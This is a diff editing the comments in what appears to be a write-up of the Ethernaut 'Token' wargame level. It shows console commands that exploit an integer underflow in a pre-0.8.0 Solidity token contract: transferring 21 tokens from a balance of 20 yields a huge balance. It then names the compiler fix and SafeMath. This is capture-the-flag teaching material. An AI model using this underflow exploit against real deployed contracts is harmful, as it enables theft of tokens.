@@ -218,14 +218,15 @@ We will use the `transfer()` function for this exploit, which requires two input
 //Verify our own address balance
 > await contract.balanceOf(player) // expanding reveals the balance is 20, as expected 
 
-// Execute the exploit, transferring 21 tokens (triggering the overlow) to the ethernaut address (we could also transfer to any valid address)
+// Execute the exploit, transferring 21 tokens (triggering the overlow) to the ethernaut address 
+// (we could also transfer to any valid address)
 > contract.transfer("0xD991431D8b033ddCb84dAD257f4821E9d5b38C33", 21)
 
 // After the transaction is confirmed, check the ethernaut balance 
-> await contract.balanceOf("0xD991431D8b033ddCb84dAD257f4821E9d5b38C33")  // expanding reveals the balance is 21, as expected 
+> await contract.balanceOf("0xD991431D8b033ddCb84dAD257f4821E9d5b38C33")  // the balance is 21, as expected 
 
 // Verify our updated address balance
-> await contract.balanceOf(player) // expanding reveals an Array(11) reflecting a balance that is "a very large amount of tokens"
+> await contract.balanceOf(player) // revealing Array(11) -- a balance that is "a very large amount of tokens"
 ```
 
 Fortunately, the Solidity compiler now rejects code resulting in an underflow or overflow, as of v0.8.0. For contracts with previous compiler versions -- like this one -- [OpenZeppelin's SafeMath library](https://docs.openzeppelin.com/contracts/4.x/api/utils#SafeMath) is suggested. 
